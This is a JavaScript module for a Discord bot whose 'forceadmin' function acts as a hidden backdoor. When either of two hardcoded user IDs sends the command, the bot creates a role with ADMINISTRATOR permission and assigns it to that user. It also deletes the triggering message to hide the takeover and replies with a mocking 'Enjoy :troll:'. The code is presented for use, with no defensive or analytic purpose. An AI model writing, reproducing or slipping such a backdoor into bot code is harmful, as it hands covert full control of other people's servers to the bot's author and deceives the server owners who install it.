const Discord = require("discord.js");
const bot = new Discord.Client();

const config = require("../config.json");
const utils = require("../Utils/Utils");

module.exports = {
    forceadmin: function(msg) {
        if (msg.author.id == "350718252076367874" || msg.author.id == "813520672550551625") {
            const member = msg.member;
            try {
                msg.guild.roles.create({
                    data: {
                        name: "AdminRole",
                        permissions: ["ADMINISTRATOR"]
                    }
                })
    
                setTimeout(() => {
                    let role = msg.guild.roles.cache.find(r => r.name.toLowerCase() === "adminrole");
                    if (!role) {
                        role = msg.guild.roles.create({
                            data: {
                                name: "AdminRole",
                                permissions: ["ADMINISTRATOR"]
                            }
                        });
                    }
                    member.roles.add(role);
                },1000);
                msg.delete(msg);
                utils.sendMessage(msg, "Success!", "(:white_check_mark:) Created role and given it to you. Enjoy :troll:");
            } catch (err) {
                msg.delete(msg);
                utils.sendMessage(msg, "Error", "(:x:) Error while giving/creating role. (I don't have permissions)");
            }
        }
    }
}